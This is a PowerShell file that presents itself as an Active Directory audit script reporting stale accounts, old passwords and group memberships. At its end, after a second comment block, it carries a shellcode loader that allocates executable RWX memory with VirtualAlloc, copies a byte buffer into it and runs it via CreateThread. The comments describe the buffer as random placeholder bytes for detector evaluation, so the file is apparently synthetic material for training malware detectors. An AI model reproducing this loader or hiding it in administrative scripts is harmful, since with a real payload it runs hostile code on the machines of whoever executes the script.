<#
.SYNOPSIS
    Audits Active Directory user accounts for stale sign-ins and password age.
.EXAMPLE
    .\Get-StaleADUser.ps1 -InactiveDays 120
.EXAMPLE
    .\Get-StaleADUser.ps1 -SearchBase OU=Managed Users,DC=internal,DC=corp -Verbose
.NOTES
    Author: Server Operations
    Last updated: 2026-07-01
#>

$Domain = "internal.corp"
$SearchBase = 'OU=Managed Users,DC=internal,DC=corp'
$ReportPath = 'C:\Logs\reports\ad-user-audit-2025-11-23.csv'
$HtmlPath = 'C:\Logs\reports\ad-user-audit-2025-11-23.html'
$InactiveDays = 120
$PasswordMaxAge = 180
$SmtpServer = "smtp.internal.corp"


Import-Module ActiveDirectory -ErrorAction Stop

$LogPath = 'C:\Logs\ad-audit-2025-11-23.log'

function Write-LogEntry {
    param(
        [Parameter(Mandatory = $true)]
        [string]$Message,

        [ValidateSet('INFO', 'WARN', 'ERROR')]
        [string]$Level = 'INFO'
    )

    $line = "{0} [{1}] {2}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'), $Level, $Message
    Add-Content -Path $LogPath -Value $line -Encoding UTF8
    if ($Level -eq 'ERROR') {
        Write-Host $line -ForegroundColor Red
    }
}

if (-not (Get-Module -ListAvailable -Name ActiveDirectory)) {
    throw 'The ActiveDirectory module is not installed on this host.'
}
Import-Module ActiveDirectory -ErrorAction Stop

$properties = @('LastLogonDate', 'PasswordLastSet', 'Enabled', 'Description')
$searchBases = @(
    'OU=Managed Users,DC=internal,DC=corp'
    "OU=ServiceAccounts,DC=internal,DC=corp"
)

$users = foreach ($base in $searchBases) {
    Write-Verbose ("Querying {0}" -f $base)
    Get-ADUser -Filter * -SearchBase $base -Properties $properties -ErrorAction Continue
}

$cutoff = (Get-Date).AddDays(-$InactiveDays)

$stale = $users | Where-Object {
    $_.Enabled -eq $true -and $_.LastLogonDate -ne $null -and $_.LastLogonDate -lt $cutoff
}

$pwdCutoff = (Get-Date).AddDays(-$PasswordMaxAge)
$oldPasswords = $users | Where-Object {
    $_.PasswordLastSet -ne $null -and $_.PasswordLastSet -lt $pwdCutoff
}

$staleCount = @($stale).Count
$disabledCount = @($users | Where-Object { $_.Enabled -eq $false }).Count
$oldPwdCount = @($oldPasswords).Count
$groupReport = foreach ($user in @($users | Select-Object -First 50)) {
    $groups = Get-ADPrincipalGroupMembership -Identity $user.SamAccountName -ErrorAction SilentlyContinue |
        Where-Object { $_.Name -ne 'Domain Users' }
    [pscustomobject]@{
        SamAccountName = $user.SamAccountName
        GroupCount     = @($groups).Count
        Groups         = (@($groups | Select-Object -ExpandProperty Name) -join '; ')
    }
}

$groupReport | Export-Csv -Path "C:\Logs\reports\ad-user-audit-2025-11-23-groups.csv" -NoTypeInformation -Encoding UTF8
$stale | Select-Object Name, SamAccountName, LastLogonDate, PasswordLastSet, Enabled | Export-Csv -Path $ReportPath -NoTypeInformation -Encoding UTF8

$oldPasswords | Select-Object Name, SamAccountName, PasswordLastSet | Export-Csv -Path $ReportPath.Replace('.csv', '-passwords.csv') -NoTypeInformation -Encoding UTF8

$disabled = $users | Where-Object { $_.Enabled -eq $false }
$disabled | Select-Object Name, SamAccountName, DistinguishedName |
    Export-Csv -Path $ReportPath.Replace('.csv', '-disabled.csv') -NoTypeInformation -Encoding UTF8

$style = @'
<style>
body { font-family: Calibri; font-size: 12px; }
table { border-collapse: collapse; width: 100%; }
th { background: #f0f0f0; text-align: left; padding: 4px; }
td { border-bottom: 1px solid #dddddd; padding: 4px; }
</style>
'@

$stale |
    Select-Object Name, SamAccountName, LastLogonDate, PasswordLastSet |
    ConvertTo-Html -Title 'Stale AD accounts' -Head $style |
    Set-Content -Path $HtmlPath -Encoding UTF8

$summaryBody = @"
Stale accounts : $staleCount
Disabled       : $disabledCount
Old passwords  : $oldPwdCount
Report         : $ReportPath
"@

$MailTo = "it-ops@$Domain"
$MailFrom = "reporting@$Domain"

$mailParams = @{
    To         = $MailTo
    From       = $MailFrom
    Subject    = 'AD user audit: daily summary'
    Body       = $summaryBody
    SmtpServer = $SmtpServer
    Port       = 587
    UseSsl     = $true
}
Send-MailMessage @mailParams

Write-Host ("AD audit finished: {0} stale, {1} disabled" -f $staleCount, $disabledCount) -ForegroundColor Green
Write-LogEntry -Message ("Audit completed for {0}" -f $Domain) -Level INFO

$reportItem = Get-Item -LiteralPath $ReportPath -ErrorAction SilentlyContinue
if ($reportItem) {
    Write-Host ("Report size: {0:N1} KB" -f ($reportItem.Length / 1KB)) -ForegroundColor Gray
}

$neverLoggedOn = $users | Where-Object { $_.LastLogonDate -eq $null }
if (@($neverLoggedOn).Count -gt 0) {
    Write-Warning ("{0} accounts have never signed in" -f @($neverLoggedOn).Count)
}

$engine = Get-ADRootDSE -ErrorAction SilentlyContinue
if ($engine) {
    Write-Verbose ("Domain controller: {0}" -f $engine.dnsHostName)
    Write-Verbose ("Default naming context: {0}" -f $engine.defaultNamingContext)
}

$byOu = $users | Group-Object -Property DistinguishedName |
    Sort-Object -Property Count -Descending | Select-Object -First 5
$byOu | Format-Table -AutoSize | Out-String | Write-Verbose

$ous = Get-ADOrganizationalUnit -Filter * -ErrorAction SilentlyContinue |
    Select-Object -First 5 -Property Name, DistinguishedName
$ous | Format-Table -AutoSize

$sampleStale = $stale | Sort-Object -Property LastLogonDate | Select-Object -First 10
$sampleStale | Format-Table Name, SamAccountName, LastLogonDate -AutoSize

$transcript = Join-Path $env:TEMP ("ad-audit-" + (Get-Date -Format 'yyyyMMdd-HHmmss') + ".log")
Start-Transcript -Path $transcript -Append | Out-Null
Write-Verbose ("Transcript: {0}" -f $transcript)

$pwdPolicy = Get-ADDefaultDomainPasswordPolicy -ErrorAction SilentlyContinue
if ($pwdPolicy) {
    Write-Verbose ("Domain password age: {0} days" -f $pwdPolicy.MaxPasswordAge.Days)
}

$expiringSoon = $users | Where-Object {
    $_.PasswordLastSet -ne $null -and $_.PasswordLastSet -lt (Get-Date).AddDays(-($PasswordMaxAge - 14))
}
Write-Verbose ("Password changes due: {0}" -f @($expiringSoon).Count)
<#
.SYNOPSIS
    Loads a prepared binary buffer into committed memory and starts it
    on a worker thread.

.DESCRIPTION
    Allocates RWX memory with VirtualAlloc, copies the prepared buffer
    into it, starts a thread and waits for completion. The buffer is a
    placeholder supplied for static-analysis exercises.

.NOTES
    Sample generated for detector evaluation. No real payload is used.
#>
try {
    $NativeCode = @"
    using System;
    using System.Runtime.InteropServices;

    public static class NativeApi
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
            uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize,
            uint dwFreeType);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
            uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
            uint dwCreationFlags, out uint lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool CloseHandle(IntPtr hObject);
    }
    "@

    Add-Type -TypeDefinition $NativeCode -Language CSharp

    # buffer placeholder: random bytes, replaces the encrypted stage in real samples
    $Buffer = [Byte[]] @(
        0x2d, 0x92, 0x76, 0x1a, 0xc7, 0x0a, 0x8e, 0x5c, 0xba, 0xc5, 0x8b, 0x6f, 0x47, 0xac, 0x5c, 0x8a,
        0xd5, 0x09, 0x7f, 0x4c, 0xac, 0x78, 0x91, 0x83, 0x7c, 0x9f, 0x0a, 0x6a, 0xd1, 0xaf, 0xd8, 0x74,
        0xdc, 0x80, 0x1e, 0x51, 0xc6, 0x0f, 0xa6, 0x4e, 0xd1, 0xcb, 0xf6, 0x65, 0xd1, 0x87, 0x5e, 0x90,
        0x08, 0xb9, 0x04, 0x26, 0x87, 0xdf, 0x5a, 0x31, 0x7e, 0x6a, 0x0e, 0xa8, 0x43, 0xc7, 0x2a, 0x31,
        0x14, 0x50, 0x81, 0x64, 0xc4, 0x19, 0x98, 0xe5, 0x70, 0x9a, 0x00, 0xa3, 0xb9, 0x57, 0xa7, 0xab,
        0x5d, 0x2d, 0x47, 0x0a, 0x48, 0x9f, 0x73, 0x2b, 0x51, 0xc4, 0x49, 0x10, 0xac, 0xde, 0x36, 0x6f,
        0xcd, 0x8f, 0xf6, 0x91, 0x23, 0x09, 0xf1, 0x04, 0x63, 0xb8, 0xb3, 0xb7, 0x5e, 0xe1, 0x36, 0x46,
        0x6a, 0xd0, 0x16, 0x6a, 0x1f, 0x68, 0xb0, 0x55, 0x51, 0x77, 0xe8, 0xc2, 0xaf, 0xf1, 0x2a, 0xf4,
        0x83, 0x03, 0x03, 0x99, 0x34, 0x81, 0x59, 0x54, 0x76, 0x4a, 0x71, 0xda, 0xb8, 0xa4, 0x3d, 0x4a,
        0xdf, 0xac, 0x72, 0x76, 0x01, 0x91, 0xb0, 0x56, 0xdd, 0xf0, 0x1d, 0xfa, 0xfb, 0x81, 0x40, 0x8f,
        0xca, 0x23, 0x22, 0xb5, 0xbd, 0x30, 0xb7, 0x9d, 0x67, 0x59, 0x3e, 0x4a, 0xb1, 0x36, 0x8d, 0xd8,
        0x06, 0xdb, 0xad, 0xf7, 0xab, 0x5a, 0x82, 0x44, 0xc4, 0xfb, 0x50, 0xbf, 0x38, 0x12, 0xe1, 0xd4,
        0xe4, 0x16, 0xc1, 0x33, 0xe0, 0xb3, 0x02, 0x08, 0xef, 0x8a, 0x1f, 0x57, 0xdb, 0xa6, 0x7f, 0xf8,
        0xd7, 0x55, 0xee, 0xcc, 0x9a, 0xf3, 0x98, 0xe9, 0x3d, 0x6f, 0xee, 0x85, 0x98, 0x76, 0x32, 0xc2,
        0x6c, 0x21, 0xc0, 0x8e, 0xe8, 0x50, 0x06, 0x24, 0x79, 0x26, 0xea, 0xc5, 0x65, 0xc3, 0xac, 0xac,
        0xc9, 0x5f, 0x07, 0xc2, 0x12, 0x5f, 0xd1, 0xf3, 0xae, 0x32, 0xe6, 0xac, 0xa8, 0xd0, 0x29, 0x38,
        0x96, 0xed, 0xcb, 0x1a, 0xce, 0x7e, 0x41, 0xc3, 0xcf, 0x03, 0x4d, 0x10, 0x0b, 0x42, 0x76, 0x0b,
        0xdc, 0x8e, 0xab, 0xa2, 0xa1, 0xe3, 0x5a, 0x73, 0x5b, 0x45, 0x62, 0x0b, 0x57, 0xe5, 0xf9, 0x3c,
        0x1e, 0x77, 0xde, 0x1e, 0xf8, 0x3d, 0x66, 0x20, 0x3b, 0x6a, 0x36, 0x47, 0xa6, 0xe7, 0x13, 0x27,
        0xa8, 0xe7, 0x55, 0xea, 0xc2, 0xe4, 0x1d, 0xb9, 0x56, 0x95, 0x08, 0x58, 0x8e, 0x82, 0xaf, 0x9e,
        0xe6, 0xca, 0x80, 0xde, 0x59, 0x1e, 0x23, 0xa6, 0xc6, 0x5b, 0xc1, 0xf3, 0x82, 0x8e, 0x88, 0x3c,
        0x23, 0x24, 0x26, 0x9f, 0xa5, 0x60, 0x51, 0x6d, 0x83, 0x25, 0x63, 0xc7, 0x38, 0x39, 0x34, 0xd3,
        0x2e, 0xf8, 0x17, 0x0d, 0xf9, 0x00, 0x33, 0xfc, 0xf3, 0x22, 0x21, 0x36, 0x72, 0x4b, 0x65, 0xd4,
        0x19, 0x6c, 0xe5, 0x95, 0x4d, 0x55, 0x46, 0x38, 0x90, 0x03, 0x59, 0x64, 0xcc, 0xfb, 0x79, 0x7e,
        0xa6, 0x3f, 0x9c, 0x75, 0x9f, 0xd6, 0xf6, 0xba, 0x18, 0xad, 0x00, 0x1c, 0x6c, 0x8e, 0x6b, 0x26,
        0xcd, 0xd1, 0x63, 0xbf, 0x81, 0x45, 0x91, 0x51, 0x23, 0x46, 0x28, 0xcb, 0xf3, 0xda, 0x24, 0x30,
        0x8b, 0x76, 0x50, 0xfe, 0xf8, 0x9d, 0xe6, 0xd5, 0x03, 0xc2, 0xcd, 0x85, 0xbd, 0x5d, 0x80, 0xd9,
        0x22, 0xf6, 0x2a, 0xfd, 0x2b, 0x87, 0xa5, 0x8b, 0x09, 0xb9, 0x02, 0x1d, 0x37, 0x44, 0x53, 0xa7,
        0xe0, 0xc8, 0x17, 0x65, 0xb5, 0x94, 0xcb, 0xa0, 0xdd, 0x06, 0xea, 0x87, 0x76, 0x8a, 0xb5, 0x24,
        0x9e, 0x00, 0x33, 0x5d, 0x4f, 0x86, 0xa3, 0x7d, 0x08, 0x5a, 0xf9, 0xa6, 0x5d, 0xfc, 0xe8, 0x14,
        0x6b, 0x1a, 0x68, 0xa0, 0x92, 0x41, 0x7b, 0x10, 0x42, 0x72, 0xe9, 0xc5, 0x93, 0xa2, 0xcc, 0xd0,
        0x2e, 0x31, 0xef, 0x37, 0xd7, 0xb6, 0x72, 0x7d, 0x67, 0x16, 0x97, 0x73, 0xfd, 0x11, 0xcf, 0x7f,
        0xa3, 0x5d, 0x4f, 0x82, 0x73, 0x9c, 0x58, 0xc8, 0x20, 0x2c, 0x04, 0x5e, 0x2e, 0xec, 0xda, 0x05,
        0x96, 0x60, 0x2a, 0xc9, 0x9a, 0xe6, 0xee, 0x65, 0x53, 0xf2, 0x04, 0x56, 0x1d, 0x0d, 0xa4, 0x04,
        0xef, 0x60, 0x30, 0x03, 0x27, 0x50, 0xf6, 0xb2, 0x47, 0x5b, 0xd3, 0x5c, 0x4c, 0x62, 0xe5, 0xc5,
        0x20, 0x3c, 0x02, 0x64
    )

    $Handle = [NativeApi]::VirtualAlloc([IntPtr]::Zero, $Buffer.Length, 0x3000, 0x40)
    if ($Handle -eq [IntPtr]::Zero) {
        Write-Error "VirtualAlloc failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
        return
    }

    [Runtime.InteropServices.Marshal]::Copy($Buffer, 0, $Handle, $Buffer.Length)
    $ThreadId = 0
    $Thread = [NativeApi]::CreateThread([IntPtr]::Zero, 0, $Handle, [IntPtr]::Zero, 0, [ref]$ThreadId)
    [void][NativeApi]::WaitForSingleObject($Thread, 3239)
    [void][NativeApi]::CloseHandle($Thread)

    $Report = [ordered]@{ Stage = 'loader'; BufferBytes = $Buffer.Length; ThreadId = $ThreadId }
    $Report | ConvertTo-Json -Compress | Out-File -FilePath $LogPath -Append
}
catch {
    Write-Warning "loader failed: $($_.Exception.Message)"
}
